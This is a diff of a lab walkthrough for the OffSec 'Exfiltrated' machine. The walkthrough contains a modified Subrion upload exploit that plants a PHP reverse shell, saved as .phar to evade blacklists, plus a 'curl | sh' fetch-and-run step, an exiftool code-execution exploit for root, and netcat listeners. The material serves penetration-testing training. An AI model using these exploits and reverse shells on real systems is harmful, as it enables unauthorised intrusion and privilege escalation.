@@ -15,13 +15,13 @@ tags:
 ![info-comm](./info-comm.png)
 This machine has a Linux OS and is rated intermediate by the community.
 
-Remember to make an entry for the IP in `/etc/hosts` file.
+Remember to make an entry for the IP in `/etc/hosts` file. My entry looks like:
 ```
 192.168.199.163 exfiltrated.offsec
 ```
 ## Nmap
 ```
-nmap -p- --open -sC -sV 192.168.199.163
+nmap -p- --open -sC -sV exfiltrated.offsec
 ```
 - `-p-`: Scans all 65535 ports on the target system. The hyphen signifies scanning all possible ports.
 - `--open`: Displays only open ports, indicating which services are active and accessible.
@@ -47,26 +47,23 @@ From reading the script, we need to use the flags `-u` `-l` and `-p`
 
 The script found in searchsploit gives us local access on Exfiltrated as the user `www-data`
 - However, the script is a webshell and it makes requests to the shell using a command that we enter
-- In order to get a fully functional reverse shell, we can create our own script to upload a reverse shell
-- I will use the following php reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and save it in a `.phar` extension to evade any php checks if there are any.
+- In order to get a fully functional reverse shell, we can manipulate the script to upload a reverse shell
 
 The main changes are as follows:
 - I will use another process (`import subprocess`) to create a netcat reverse shell so only one script needs to be run.
 - URL is hardcoded to `http://exfiltrated.offsec/panel`. This simplifies the script so it does not need any flags, so make sure that the ip is set in `/etc/hosts` file
 - The `shell_upload()` function replaced the old php webshell file with a reverse shell
-
+- I will use the following php reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and save it in a `.phar` extension to evade any php file extension blacklists if there are any
 
 **The full script is below:**
-
+- change the IP in the php reverse shell to point to your host
 ```
 #!/usr/bin/python3
-
 
 import requests
 import time
 import random
 import string
-import sys
 from bs4 import BeautifulSoup
 import subprocess
 
@@ -75,10 +72,9 @@ url_upload = url + 'uploads/read.json'
 url_shell = url + 'uploads/'
 username = "admin"
 password = "admin"
-netcat_port = 80
+netcat_port = 1234
 
 session = requests.Session()
-proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
 
 def login():
     global csrfToken
@@ -166,8 +162,8 @@ Content-Type: application/octet-stream
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.45.185';
-$port = 80;
+$ip = '192.168.45.185'; // CHANGE THIS
+$port = 1234;
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -282,7 +278,7 @@ Content-Disposition: form-data; name="mtime[]"
 
 1702030664
 -----------------------------870492933289164732357145027--"""
-        res = session.post(up_url, headers=up_headers, data=up_data, proxies=proxies)
+        res = session.post(up_url, headers=up_headers, data=up_data)
         if "error" in res.text:
              print('[x] Shell upload failure: '+url_upload+' ')
         else:
@@ -296,7 +292,7 @@ def code_exec():
     auth_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5",
                             "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://exfiltrated.offsec", "Connection": "close", "Referer": "http://exfiltrated.offsec/login/", "Upgrade-Insecure-Requests": "1"}
     shell_url = "http://exfiltrated.offsec/uploads/"+shell_name+".phar"
-    req = session.get(shell_url, headers=auth_headers, proxies=proxies)
+    req = session.get(shell_url, headers=auth_headers)
 
 login()
 name_rnd()
@@ -321,6 +317,7 @@ reset
 To assess the attack surface, run `linpeas.sh` on the target:
 - run a python http server in the directory with the `linpeas.sh` file with `python3 -m http.server 80`
 - then use the `curl` command with `sh` to run the script on the target machine
+- the IP specified is downloading from my Kali host
 ```
 curl http://192.168.45.185/linpeas.sh | sh
 ```
@@ -329,24 +326,32 @@ curl http://192.168.45.185/linpeas.sh | sh
 From the scan results, we can see a cronjob is running.
 ![cronjob](./cronjob.png)
 
-From the /opt directory, user `www-data` does not have write privileges.
-- reading the script `image-exif.sh` shows that it is executing the command `exiftool`
+Reading the script `image-exif.sh` in the `/opt` directory shows that it is executing the command `exiftool` on `jpg` files in the `/uploads` directory 
+![image-exif](./image-exif.png)
 
-The following [Arbitrary Code Execution](https://www.exploit-db.com/exploits/50911) script will generate an image that will be processed by the cronjob
-- run the script using `-s` flag and your kali IP and port
-![exiftool](./exiftool.png)
+#### Exiftool Arbitrary Code Execution
+Searching for an exiftool exploit, we come across the following [Arbitrary Code Execution](https://www.exploit-db.com/exploits/50911) script
+- this script will generate an image that will be processed by the cronjob
+- run the script using `-s` flag for reverse shell and your kali IP and port
+- running the command `searchsploit exiftool` will result in the same script
+- download the script with `searchsploit -m linux/local/50911.py`
+```
+python3 50911.py -s 192.168.45.185 4444
+```
 
-Move to the `/var/www/html/subrion/uploads/` directory on the target then download the image from host
-- this will download the image file into the directory that the cronjob is processing
+Move to the `/var/www/html/subrion/uploads/` directory on the target then download the processed image from host
+- start python server in the directory with the image `python3 -m http.server 80`
+- then, the curl command below will download and save the image file into the directory that the cronjob is processing
 ```
 curl http://<kali_ip>/image.jpg -o image.jpg
 ```
 
-Start a netcat listener on port specified when creating the `image.jpg` file. In my case, port 4444.
+Start a netcat listener on port specified when creating the `image.jpg` file
+- In my case, port 4444.
 ```
 nc -lnvp 4444
 ```
-- then wait for the cronjob to Firefox
+- then wait for the cronjob to fire
 ![root](./root.png)
 
 # Summary
